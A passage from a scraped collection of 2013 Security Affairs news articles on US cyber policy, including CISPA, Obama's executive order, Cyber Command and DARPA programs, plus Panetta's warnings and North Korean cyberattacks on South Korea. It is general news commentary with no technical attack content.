possible through voluntary sharing of Internet traffic between private companies and the authorities. The bill was supported by corporates such as Intel, Oracle, Symantec, AT&T, Facebook, IBM, Verizon, and many others, CISPA would expire after five years, and requires congressional action to be renewed. The principal concerns are related to the operations conducted by foreign governments and state sponsored hackers that pack a powerful offensive against national networks, in particular US official fear the aggressive behavior of hostile countries such as Iran and North Korea and competitors such as Russia and China. The order has arrived after cybersecurity legislation failed to pass through Congress because it was judged no suitable to protect the nation\u2019s critical infrastructure and guarantee at same time the privacy of consumer information that could be shared by companies. Many organizations of private citizens are on the warpath, the Fight for the Future, a non-profit group \u201cworking to extend the Internet\u2019s power for good,\u201d has published an online petition to express opposition to the bill. US Government is trying to sensitize population on the cyber warfare and risks related to a cyber attacks, the fear on an imminent cyber attacks against critical infrastructures is high, national cyber units and security experts have detected an intense probing of national networks by foreign states and according many specialists is just the tip of the iceberg. Janet Napolitano, head of Homeland Security in January warned that a \u201ccyber 9/11\u201d, which could cripple critical infrastructures such as telecommunication, water, electricity and gas, may be \u201cimminent\u201d. She argued before Congress to pass cyber bill:\n\n\u201cWe shouldn\u2019t wait until there is a 9/11 in the cyber world. There are things we can and should be doing right now that, if not prevent, would mitigate the extent of damage,\u201d  \n\nUnited States Secretary of Defense Leon Panetta has the same opinion and exposed his perplexities in various public interventions.\n\n\u201cAn aggressor nation or extremist group could gain control of critical switches and derail passenger trains, or trains loaded with lethal chemicals,\u201d  \u201cThey could contaminate the water supply in major cities, or shut down the power grid across large parts of the country.\u201d Panetta declared.\n\nOf course Panetta is in favor of CISPA, he added:  urged that the bill should be passed \u201cto safeguard our national security.\u201d But all the world was waiting for Obama\u2019s decision, he is one of the heads of state that pay more attention to the issue of cyber security, all the worldwide IT community was waiting for a President\u2019s executive order on the matter as announced by Bloomberg\u2019s journalists, and the order was signed. The order has the primary goal to improve the network security of \u201ccritical infrastructure\u201d of US, it assigns to the National Institute of Standards and Technology the responsibility of developing a framework of best practices for operators in critical sectors of the country  (e.g. industry, transportation, water and health) in the next 240 days. The Policy places at the base of the reform process the following three strategic principles:\n\nAlso Department of Homeland Security is involved in the process driving voluntary program works with various agencies for the divulgation and adoption of best practices to ensure security of infrastructures. The very nature of an executive order is a demonstration of the urgency to protect the national critical infrastructures and to implement the envisaged retrenchment against the constant attacks that daily affect the US networks. The plan is certainly ambitious and difficult to implement within the time set by the government, but it is a tangible demonstration of its commitment, the strategy needs the active support of intelligence agencies and the effort of every citizen.\n\nPierluigi Paganini\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/cispa", "topic_name": "Cispa"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-warfare", "topic_name": "cyber warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cybersecurity", "topic_name": "Cybersecurity"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/data-breaches", "topic_name": "Data-breaches"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/executive-order", "topic_name": "executive order"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/federal-reserve", "topic_name": "Federal Reserve"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/obama", "topic_name": "Obama"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/state-sponsored-hackers", "topic_name": "state sponsored hackers"}]}, {"news_name": "Is US really thinking to preemptive cyber attacks as deterrent?", "news_link": "https://securityaffairs.co/wordpress/12235/cyber-warfare-2/are-us-really-thinking-to-preemptive-cyber-attacks-as-deterrent.html", "title": "Is US really thinking to preemptive cyber attacks as deterrent?\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "February 8, 2013", "body": "Cyberspace is abuzz with activity.

The principal question raised by these fervent activities are rules of engagement and proportionality of defense \u2013 the operative limit of country that discovers an attack against its network. Can we envisage an automated decision making process in defence?\n\nRecently many cases have highlighted intense cyber espionage activity against US Government and private industries with intent to steal information. The principal suspect is China, due to characteristic techniques adopted by hackers. Obviously this is just tip of iceberg.\n\nThe Obama administration has discovered that the President has power to order preemptive cyberattack to discourage those who    violate the US network, especially China, which is unresponsive to US efforts to mitigate attacks.\n\n\u201cNew policies will also govern how the intelligence agencies can carry out searches of faraway computer networks for signs of potential attacks on the United States and, if the president approves, attack adversaries by injecting them with destructive code \u2014 even if there is no declared war.\u201d\n\nThe alert level has increased after the recent attacks on media agencies. Security experts are convinced that they are state-sponsored operations due the means and methods adopted.\n\nThe discussion on a possible preemptive attacks is in my opinion a provocation; it\u2019s clear that that both US and China are pursuing their cyber strategies and are respectively conscious of the cyber capabilities of their adversaries; the declarations are a public admission of failure of diplomatic efforts.\n\nUS could increase pressure on China requiring for example major purchases of Chinese goods to go through national security reviews, according to the Council on Foreign Relations (CFR), but  that is very different from the organization of a cyber attacks for demonstrative purpose.\n\nIs Obama\u2019s administration really willing to give up so prolific commercial relationship?\n\n\u201cAdam Segal wrote in a blog post that China has responded by saying through the People\u2019s Daily that the administration\u2019s position could trigger a worldwide arms race.\u201d\n\nThe U.S. threat of a pre-emptive strike could increase risk overall, and preemptive attack could be addressed against the wrong targets due the difficulty in locating the origin of attack\n\nWe must also consider that governments will continue to operate secretly in cyber space also on the offensive front and that statements of a pre-emptive attack are only a warning to the world about cyber capabilities of the country.\n\nCyber weaponry is the most complex arms race under way.

Last week I wrote about Russian government and the Putin\u2019s request to reinforce the garrison of the fifth domain, the cyber space, through a series of investment to secure national critical infrastructures from cyber attacks, in the previous months we have spoken of Iran, China and North Korea, all those governments are moving the battlefield in the digital world.\n\nThe US and Israel are considered in cyber warfare context most advanced countries, according international specialized press they have been involved in the creation of the first worldwide recognized cyber weapon, Stuxnet, and of many other related spy tool kits such as Flame.\n\nAccording US officials the government is \u201cis constantly looking to recruit, train and retain world class cyber personnel,\u201d\n\nBoth governments, US and Israeli ones, are improving their cyber capabilities in response to high number of cyber attacks they daily suffer, The Pentagon has announced a major expansion of its cyber army to defend national infrastructures, as well as to empower offensive computer operations against hostile states.\n\nThe US government has decided an increase of 4000 units for the Defense Department\u2019s Cyber Command, considering that actually the Command is composed by 900 specialists it has been decided to quadruple the resources dedicated to the operations in the cyberspace.\n\nThe expansion will be structured and will create the following three distinct areas controlled by Defense Department\u2019s Cyber Command:\n\nWilliam J. Lynn III, a former deputy defense secretary who worked on the Pentagon\u2019s cyber security strategy declared:\n\n\u201cThe threat is real and we need to react to it,\u201d\n\nPentagon has started various projects and initiatives to involve the private companies, universities and even computer-game companies to develop technologies to improve its cyber warfare capabilities.\n\nObama administration is massive investing in the cyber warfare preparing its structures to respond to cyber threats and also creating the condition to launch effective attacks against foreign and hostile states. If confirmed the \u2018Olympic Games\u2019 operation if the first sample of offensive conducted in the cyber space and arranged without conventional weapon, using digital attacks instead of military operations.\n\nUS has recently started the Plan X project that will involve also private non-military entities in what is considered \u201ca call to arms\u201d, it is more oriented on protecting the Defense Department\u2019s computer systems than on disrupting or destroying those of enemies according official sources. Plan X is a project of the DARPA (Defense Advanced Research Projects Agency), a Pentagon section responsible for the development of new technology for use by the military.\n\n\u201cBecause the origins of cyberattack have been in the intelligence community, there\u2019s a tendency to believe that simply doing more of what they\u2019re doing will get us what we need,\u201d\n\nsaid Kaigham J. Gabriel, acting director of DARPA.\n\n\u201cThat\u2019s not the way we see it. There\u2019s a different speed, scale and range of capabilities that you need. No matter how much red you buy, it\u2019s not orange.\u201d\n\nOne of the main aspects of a warfare is the deep knowledge of the battlefield, for this reason one of the main projects to be financed is the tracking of cyberspace and all entities that populate it, its map have to be updated over time to allow precise monitoring of main area of battle. Other projects will be related to the hardening of Operating Systems, for mobile devices and desktop installations, to resist to any king of cyber attacks, US researchers have a clear idea of the OSs of the future, totally different from the one we ordinary use.\n\n\n\nMany experts sustain the one of the primary target is to develop a new generation of cyber soldier, artificial intelligence able to prevent cyber attacks and that is able to conduct powerful offensives automatically. The research program promoted by DARPA agency has a duration of five years and will be financed with $110 million starting from this summer. The agency has allocated a total budget of $1.54 billion from 2013 to 2017 with the specific target to increase cyber-offense capabilities.\n\nDARPA has recently announced the development of many other interesting projects, one of the most ambitious is the new Cyber Targeted-Attack Analyzer program that will attempt to automatically monitor the entire defense network without human intervention. Another interesting project is the Space Enabled Effects for Military Engagements, also known as SeeMe, that will build a constellations of micro-satellites to provide troops with accurate satellite imaging within 90 minutes.\n\nWhat is the theme of the main projects related to cyber warfare capabilities?\n\nGovernments all around the world are committed for the definition of a proper cyber strategy that represents an optimum balance between a good cyber offense and an efficient cyber defense. Cyber conflicts are characterized by the necessity of an immediate cyber response to the incoming cyber threats, in many cases the reaction must be instantaneous to avoid the destruction of assets and resources.\n\nHuman factor and human capacity of judgment could represent element of delay not acceptable in an electronic disputes that happen in real time, due this reason is assuming fundamental importance the concept \u201cproactive defense\u201c. The massive introduction of technologies in every object the surround us has increased nation attack surface, power grids, telecommunications and any other critical infrastructure are still vulnerable to cyber attacks.\n\nThe protection of national infrastructures is one of the primary goals for cyber strategies, but due nature of the possible offense, instantaneous and unpredictable, has highlighted the need to develop systems for automatic defense that can independently respond to a cyber threats from cyber space, but this option introduces significant problems in terms of \u201cdevolution of decision\u201d and \u201crule of engagement\u201d.\n\nAre we ready to trust in such critical decisions taken by the machines?\n\nThe Homeland Security Department In September has released REQUEST FOR INFORMATION \u2013 RFI-OPO-12-0002 titled \u201cDeveloping a Capability Framework for a Healthy and Resilient Cyber Ecosystem Using Automated Collective Action\u201d to gather information from Industry to evaluate the current state of technology in the cyber ecosystem environment.\n\nThis Department is working with NIST to develop system capable of using a defensive concept called Automated Collective Action, following the definition provided in the document:\n\n\u201cAutomated collective action refers to processes in a cyber ecosystem or community of interest (COI) that select (and perhaps formulate) automated courses of action that will be performed by the ecosystem or COI in response to cybersecurity events. Policies, procedures, technology, and a high level of trust are necessary to enable automated collective action. An appropriate level of human intervention might be required to ensure unintended consequences do not result from flawed courses of action. Determining which cybersecurity events are normal and which are unauthorized or malicious remains a major challenge. \u201c\n\nThe officials of DHS declared that US need to respond in automated fashion to automated attacks from cyber space. The researches need to evaluate the feasibility of a system completely independent in the detection of anomalous situations and able to respond in a proportionate manner, the solution thanks to automated processes have to be able to monitor and respond to cyber threat while maintaining mission-critical operations.\n\nThe final target is the substitution of humans into the decision loop to respond to increasingly sophisticated attacks.\n\nIn more than one occasion U.S. Defense Secretary Leon Panetta. U.S. Defense Secretary Leon Panetta, has expressed very concern about the possibility of a major cyber attack against the country and its critical infrastructures, to aggravate the scenarios the economic crisis which has inevitable effects on the budget allocated to the defense.\n\nThe government is planning the biggest cuts to defense budget of the last decade, around $450 billion over a period of ten years. Persistent rumors speak of a further cut of $500 billion due an automatic mechanism of protection known as sequestration after members of Congress failed to reach an agreement to reduce the nation\u2019s deficit.\n\nThe cuts represent a serious problem for the development of US capabilities in a delicate historical period, meanwhile the principal adversaries of US such as Iran, China and also Russia are massive investing trying to acquire a strategic advantage under this perspective.\n\nIn June 2012 Panetta warned on the possible risks deriving from the cuts, on the argument he said:\n\n\u201cIt would guarantee that we hollow out our force and inflict severe damage on our national defense. I think you all recognize that sequester would be entirely unacceptable and I really urge both sides to work together to try to find the kind of comprehensive solution that would de-trigger sequester and try to do this way ahead of this potential disaster that we confront,\u201d\n\n\u201cI\u2019m very concerned that the potential in cyber to be able to cripple our power grid, to be able to cripple our government systems, to be able to cripple our  financial systems would virtually paralyze this country and as far as I\u2019m concerned that represents the potential for another Pearl Harbor  as far as the kind of attack that we could be the target of using cyber,\u201d\n\nThe scenario hypothesized by Panetta is realistic and dramatic, a cyber attack against an US critical systems could represent a disaster. The possible source of attacks could be foreign governments but also cybercriminals or cyber terrorists.\n\nIn October, Mr. Panetta raised again the question with strong words, the US was facing the possibility of a \u201ccyber-Pearl Harbor\u201d and was increasingly vulnerable to cyber attacks against its critical infrastructures that could cause a catastrophe.\n\nPanetta was particularly concerned by the growth of Iranian cyber army that many sources accredit for the attacks to Saudi Aramco and that could be able to hit US on national soil through a cyber attack.\n\nBut cyber espionage campaigns are also considered operations of cyber warfare, foreign governments could be interested to spy on intelligence agencies and government offices to steal sensible information, let\u2019s remind the recent attack to the White House.\n\nAlso industry and defense subcontractors are considered strategic targets for state-sponsored hackers that try to acquire intellectual property on military technology.\n\nThe world is changing and also warfare operations are shifting to cyber space, the battlefield is changed and also the actors of new conflicts are totally mutated, US such as any government must be prepared to the cyber warfare empowering its cyber capabilities.\n\nPierluigi Paganini\n\n \n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructures", "topic_name": "Critical infrastructures"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-capabilities", "topic_name": "cyber capabilities"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-security", "topic_name": "cyber security"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-warfare", "topic_name": "cyber warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/flame", "topic_name": "Flame"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/israel", "topic_name": "Israel"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/plan-x", "topic_name": "Plan X"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/proactive-defense", "topic_name": "Proactive defense"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/russia", "topic_name": "Russia"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/russian-government", "topic_name": "Russian Government"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/state-sponsored-hackers", "topic_name": "state sponsored hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stuxnet", "topic_name": "stuxnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/us", "topic_name": "US"}]}, {"news_name": "DARPA on Cyber Targeted-Attack Analyzer program & micro-satellites", "news_link": "https://securityaffairs.co/wordpress/11926/security/darpa-on-cyber-targeted-attack-analyzer-program-micro-satellites.html", "title": "DARPA on Cyber Targeted-Attack Analyzer program & micro-satellites\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "January 24, 2013", "body": "Protect the country, population and assets from cyber threats, this is a must for every government, a challenge for  every state, new processes, large investment and innovative researches are the topics most debated in this period. Yesterday I wrote about the Russian government and its commitment to strengthen cyber defense, today I desire to introduce how US are trying to improve their cyber capabilities to face with cyber threats. Surely one of the most interesting and prolific agency in this sense is the US DARPA (Defense Advanced Research Projects Agency) responsible for the development of new technologies for use by the military, so I decide to introduce some of its actual and future works that could impact security in cyberspace. Few days ago the agency announced the development of a program to design a defense system able to uncover and prevent targeted cyber attacks based on the computer network managed directly from Department of Defense. The network is considered one of the largest structure in the world and is used to provide a connection infrastructure to personnel across the globe, through the net the employees of DoD collect, transfer and process any kind of information referring a multitude of sources using various device. The network is also used for military operative purposes, its nodes include in-the-field mobile devices and mission computers on board F-18\u2019s, it is fundamental to understand the dynamicity of the structure due the continuous technological improvement and the huge and growing quantity of information managed. This characteristic make very difficult its protection against cyber attacks, perimeter defense  could be inappropriate, that why DARPA researchers are trying to define a new defensive model. The announcement made on DARPA web site states:\n\n\u201c[DARPA] seek a new approach, one that relies on knowing the cyber terrain within the network and understanding how information across the enterprise is connected to find actions associated with an attack buried under within all the normal data.\u201d\n\nThe project appears ambitious and hard to realize, the new Cyber Targeted-Attack Analyzer program will attempt to automatically monitor the entire network, every node and correlate the data flow from different sources despite the technological mutation of the network, its grows and shifts. The principal deliverables of the project are:\n\nThe principal problem is identify in a timely manner the information flows with the intent to be able to discriminate any faults in it, in a successive phase of program the agency seeks to build tools that use this information for cyber defense of the network. DARPA program manager Richard Guidorizzi declared:\n\n\u201cThe Cyber Targeted-Attack Analyzer program relies on a new approach to security, seeking to quickly understand the interconnections of the systems within a network without a human having to direct it,\u201d \u201cCyber defenders should then be capable of more quickly discovering attacks hidden in normal activities.\u201d\n\nNetworks aren\u2019t the only concern of  DARPA that is looking with great attention to UAV and satellites technologies considered pillars of military operations. DARPA is specializing its researches on micro-satellites used for spying purpose and to support militias in case of battlefield. UAV technology is also used for this task but has the great limit that the aircraft need to be re-fueled, on the other side orbiting satellites have operational windows limited by their overflight schedule. DARPA is evaluating the creation of a hybrid solution to support troops in real time, Tom Bussing, vice president of Advanced Missile Systems at Raytheon Missile Systems declared.\n\n\u201cWe\u2019re putting near-real time data where the warfighter needs it \u2013 directly into their hands \u2013 and providing them with vital, tactical intelligence they can control,\u201d\n\n\n\nRaytheon is often present in DARPA projects, let\u2019s remind CHAMP project developed by Air Force Research Laboratory that explores the possibility to design a directed-energy weapon capable of destroying and interfering with adversary\u2019s electronic systems such as radar systems, telecommunication systems, computer systems and power distribution systems. While the project is started in military and is led by Boeing the technology comes from a small company called Ktech, acquired by Raytheon bought last year, specialized in the providing of microwave generators to generate EMP able to knock out electronics equipment. Last December, DARPA awarded Raytheon a $1.5 million contract for first Phase of the Space Enabled Effects for Military Engagements (SeeMe) project that will build a constellations of micro-satellites to provide troops with accurate satellite imaging within 90 minutes. DARPA program manager Dave Barnhart added:\n\n\u201cSeeMe is a logical adjunct to UAV technology, which will continue to provide local or regional very high-resolution coverage, but which can\u2019t cover extended areas without frequent refueling,\u201d\n\nThe satellites will have reduced dimensions, about 3 feet long, a foot in diameter, weigh around 25 pounds, and carry a $500,000 price tag.\n\nBoth projects are in the embryonic phase but DARPA agency consider them strategic to support future military operations and are the demonstration of the effort that governments are spending to improve their cyber capabilities in an era where technology is the most important factor for both defense and offense.\n\nPierluigi Paganini\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-capabilities", "topic_name": "cyber capabilities"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-security", "topic_name": "cyber security"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-targeted-attack-analyzer-program", "topic_name": "Cyber Targeted-Attack Analyzer program"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/darpa", "topic_name": "DARPA"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/micro-satellites", "topic_name": "micro-satellites"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/russian-government", "topic_name": "Russian Government"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/seeme", "topic_name": "SeeMe"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/targeted-cyber-attacks", "topic_name": "targeted cyber attacks"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/uav", "topic_name": "UAV"}]}, {"news_name": "Panetta is critical on the security level for NATO networks", "news_link": "https://securityaffairs.co/wordpress/11891/security/panetta-is-critical-on-the-security-level-for-nato-networks.html", "title": "Panetta is critical on the security level for NATO networks\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "January 22, 2013", "body": "Today on Atlantic Council web site it has been published an excerpts from remarks by Secretary of Defense Leon Panetta at King\u2019s College in London that remarks the inadequacy of NATO networks to reject cyber threats, according the officials the situation appears really critic in both private and public sectors, and it is very concerning also for military environments.\n\nCyber threat are evolving becoming increasingly sophisticated and the number of cyber attacks is increasing in impressive way according the data provided by principal security firms.\n\nHackers, cyber criminals, cyber terrorists, hacktivists and state sponsored actors are the forces that move the offensive against States and their assets causing \u201cextraordinary physical and monetary damage\u201d.\n\nDespite the number of attacks against control system in critical infrastructures is increased in the last years, the principal losses are related to cyber attacks that try to obtain the control of the victims stealing in silent mode sensible information or financial credentials. Principal security firms agree that malicious trend will grow in 2013.\n\nCompanies, government agencies and private citizens are still too vulnerable to cyber attacks, and it is not easy to establish an early warning in case of offensive. Hackers are increasing their capabilities but we are assisting also to a dangerous trend, the resources necessary to conduct a cyber attacks are becoming available to everyone, it is quite easy to find and acquire in the underground exploits to hit any kind of targets.\n\nIt is impossible to distinguish cyber criminals by state sponsored hackers, in many cases the figures merge exactly as happen for other prolific business such as the weapon trade.\n\nPanetta in his speech said:\n\n\u201cState and non-state actors are developing capabilities that could inflict extraordinary physical and monetary damage, could paralyze our economies and harm our infrastructure, take down our power grid system, take down our financial systems, take down our government systems, take down our banking systems.  That\u2019s a reality.  That technology is real and threatening today. \u201c\n\nWe all living in a technology era, the borderline between real world and cyberspace is thin and mutual interferences and interactions are increasing, a cyber strategy could influence a politic and vice versa, in many cases the disputes are moving in the what is considered  the fifth domain of warfare, the digital world.\n\n\n\nA society that live in the cyber era must be able to guarantee free and secure access to cyber space to its population, and despite the effort spent by governments this is becoming increasingly difficult, Panetta highlighted that both US and Europe must make considerable effort to secure their assets, it is an investment but also a requirement that cannot be postponed.\n\nPanetta added:\n\n\u201cFor its part, NATO has made important progress in strengthening the security of its own networks, but those steps alone are not sufficient  to defend against the cyber threat.  The alliance needs to consider what its role should be in defending member nations from cyber-attacks.  We must begin to take the necessary steps to develop additional alliance cyber defense capabilities\u201d\n\nThe words speak for themselves, we are facing with the necessity of making common factor in combating a growing threat, an offensive asymmetrical and unpredictable, for which containment it is required cooperation of all members of NATO.\n\nDespite NATO has conducted important initiatives and made fundamental progresses in cyber security Panetta believes the effort is not sufficient because of the dynamic nature of the offense.\n\nSecurity is a process that must growth day by day, a culture that must be diffused between populations of NATO  states members, that requests the strong commitments of central governments and their prolific collaboration to bolster defensive cyber operational capabilities.\n\nPierluigi Paganini\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructures", "topic_name": "Critical infrastructures"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-criminals", "topic_name": "cyber criminals"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hackers", "topic_name": "Hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacktivists", "topic_name": "hacktivists"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/nato", "topic_name": "NATO"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/panetta", "topic_name": "Panetta"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/security-2", "topic_name": "security"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/state-sponsored-actors", "topic_name": "state sponsored actors"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/us", "topic_name": "US"}]}, {"news_name": "Use of electromagnetic waves to infiltrate sealed networks", "news_link": "https://securityaffairs.co/wordpress/11880/cyber-warfare-2/use-of-electromagnetic-waves-to-infiltrate-sealed-networks.html", "title": "Use of electromagnetic waves to infiltrate sealed networks\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "January 21, 2013", "body": "In the last months I had the opportunity many times to read about the possible use, in cyber warfare context,  of electromagnetic waves to interfere with defense systems of the adversaries. I wrote about a project dubbed CHAMP  (Counter-electronics High-powered Microwave Advanced Missile Project) related to the use of microwaves to permanently knock out computers in a specific area. The project is born in US military environment, specifically developed by Air Force Research Laboratory, and it explores the possibility to design a directed-energy weapon capable of destroying and interfering with adversary\u2019s electronic systems such as radar systems, telecommunication systems, computer systems and power distribution systems. While the project is started in military and is led by Boeing the technology comes from a small company called Ktech, acquired by Raytheon bought last year, specialized in the providing of microwave generators to generate EMP able to knock out electronics equipment. Recently a report published by Defense News revealed that the Intelligence and Information Warfare Directorate (I2WD) of the US Army is studying the use of electromagnetic waves to infiltrate sealed networks. The report illustrates that the US army is running the Tactical Electromagnetic Cyber Warfare Demonstrator program with the dual objective of sniffing data and injecting data into sealed cable networks. The intent is clear, a cyber army adopting electromagnetic waves could be able to spy on network or interfering with transmission altering the content of transmission for example introducing a malware in it. The research on the use electromagnetic waves is not new, NSA has been carrying out research in the topic for a long time, project TEMPEST is the demonstration. The technology could be used by a government with an unmanned aircraft flying over the location where target networks are located, let\u2019s think for example a critical infrastructure and its control systems that could be infected despite they are isolated from internet. The approach is totally equivalent to the physical access to a network, the use of  electromagnetic waves allows to the attackers to access directly to the target network. The Stuxnet case demonstrated that accessing to the network of critical infrastructure is possible to cause serious damages, for the attack was used an infected USB flash drive containing the popular Stuxnet virus able to exploit zero-day vulnerabilities of the host.\n\nWhat is the evolution? Attack the target network without physically access to it eluding the defense systems adopted to mitigate cyber threats.\n\nDespite the technology is available and tests conducted demonstrated its efficiency, the use of  electromagnetic waves is still immature due significant range and bandwidth limitations, the source of waves in fact has to be very close to the target network and transmission of complex data is considered time consuming for the scope. Going back in time it is possible to find another interesting project, Suter, a military computer program developed by BAE Systems that has with purpose the attack of computer networks and communications. The program has been managed by Big Safari, a secret unit of the United States Air Force, Suter was integrated into US unmanned aircraft. The program has been tested with different aircrafts and used in Iraq and Afghanistan since 2006, according military experts a technology similar to Suter was used by the Israeli Air Force to attack Syrian radars in the Operation Orchardon on September 6th , 2007. No doubts the use of electromagnetic waves to interfere with defense systems is a winner choice that\u2019s way many governments are working on projects on the this technology.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Hacking) \n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-warfare", "topic_name": "cyber warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/electromagnetic-waves", "topic_name": "electromagnetic waves"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/intelligence-and-information-warfare-directorate-i2wd", "topic_name": "Intelligence and Information Warfare Directorate (I2WD)"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stuxnet", "topic_name": "stuxnet"}]}, {"news_name": "Cyber warfare between Koreas, a warning for any cyber power", "news_link": "https://securityaffairs.co/wordpress/11834/intelligence/cyber-warfare-koreas-warning-cyber-power.html", "title": "Cyber warfare between Koreas, a warning for any cyber power\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "January 18, 2013", "body": "Earlier this month is has been spread the news that South Korea is investing to improve the cyber capabilities of the country recruiting and training hackers to involve in the cyber defense due the increasing number of attacks suffered.\n\nA cyber attack hit recently the presidential transition team, in particular the press rooms server, but real extent of the damage caused by the event was not determined according the, Yonhap News Agency reports. The authorities has identified the servers used by the attackers, 17 units were located in 10 foreign countries and 2 systems have been found within the country.\nOne of the servers was constantly connected to an IP address of the Joson Telecommunication Company, an affiliate of North Korea\u2019s Posts and Telecommunications Ministry. North Korean cyber units are accused also for another attack that last year in June hit conservative  JoongAng Ilbo, a newspaper published in South Korea that is considered one of the big three newspapers of the country with an edition of 1.96 million copies. The popular paper also publishes an English edition, Korea JoongAng Daily, in partnership with the English International Herald Tribune.\n\nThe news has been provided by the National Police Agency\u2019s Cyber Terror Response Center, the cyber division of the Korean National Police Agency (KNPA), operated within the Agency\u2019s Investigation Bureau, that verified the origin of the attack against the newspaper\u2019s website.\n\nThe security specialists form South traced back the attack to an IP address at North Korea\u2019s Ministry of Posts and Telecommunications, the address was used repeatedly by the hackers to access to daily\u2019s main server since a couple of months before the attacks, probably for cyber espionage purpose.\n\nThe National Police Agency\u2019s Cyber Terror Response Center declared:\n\n\u201cThe first hacking attack on the server was nearly timed with the North Korean Army\u2019s warning on April 23 last year of provocation that a \u2018revolutionary force will take action soon,'\u201d \u201cIt seems that the North made meticulous preparations once it singled out a particular media outlet for the cyber attack.\u201d \n\nThe hackers gained the access to the administrator\u2019s pc of the journal on June 7th and accessed to production environment two days later, defacing the front end of the Korea JoongAng with a picture of a white cat grinning and covering its mouth with the words, \u201cHacked by IsOne,\u201d flashing beneath the picture.\n\nThe effect of the attacks was serious, it succeeded to blog the production of the paper, the Cyber Terror Response Center of the National Police Agency explained that their investigation was very difficult because the hackers wiped out entire system.\n\nThe North Korea, one of the most active countries in the cyber space, is not new to similar offensives, it launched a couple of large DDoS attacks on various targets in South Korea on July 7, 2009 on government website and on March 4th, 2011, state sponsored hackers also attacked Nonghyup Bank\u2019s computer systems and accessed to e-mail accounts of students and alumni of Korea University.\n\nDuring the attack occurred on July 7th, 435 different servers in 61 countries were used to conduct a distributed denial of service (DDoS) attack against South Korean government Internet sites, meanwhile in the offensive of 2011, March 4th, the DDoS hit state institutions such as the presidential office, the National Assembly and media media.\n\nThe national Police also succeeded to trace the origin of the DDoS attack, 17 servers used in the offensive are located in 10 in 10 countries overseas and one them has been also involved in the attack occurred in 2011 on Nonghyup Bank.\n\nThe malware used were the same that had been used in the DDoS attacks in July 2009 and in the hacking of the Korea University e-mail accounts. North Korea is considered a country with considerable hacking capabilities, According US official declarations North Korea has added new sophisticated cyber weapons to its arsenal causing much concern in political and military.\n\nThe professor Lee Dong hoon at the Center for Information Security Technologies at Korean University in Seoul declared that North Korea has been preparing for cyber warfare since the late 1980s and ranks third worldwide in this field after Russia and the US.\n\nNorth Korea has the highest percentage of military personnel in relation to population than any other nation in the world, with approximately 40 enlisted soldiers per 1000 people with a considerable impact on the economy of the country.\n\nA defector has declared that North Korea has increased its cyber warfare unit to staff 3,000 people and it is massive training its young prodigies to become professional hackers.\n\nIntelligence sources in South Korea believe that the Nation has a large a cyber force that responds to the command of the country\u2019s top intelligence agency, the General Reconnaissance Bureau that is responsible for collecting strategic, operational, and tactical intelligence for the Ministry of the People\u2019s Armed Forces.\n\nAccording the revelation of Army General James Thurman, the commander of US Forces Korea, the government of Pyongyang is massive investing in cyber warfare capabilities, recruiting and forming high skilled team of hackers. The groups will could be engaged in offensive cyber operation against hostile government and in cyber espionage activities.\n\nThe central government reserves for young hackers several incentives providing best tools on the market and providing living conditions for them and their families extremely advantageous. The importance assigned to the professional development of new cyber military is indicative of the perception of how the cyber 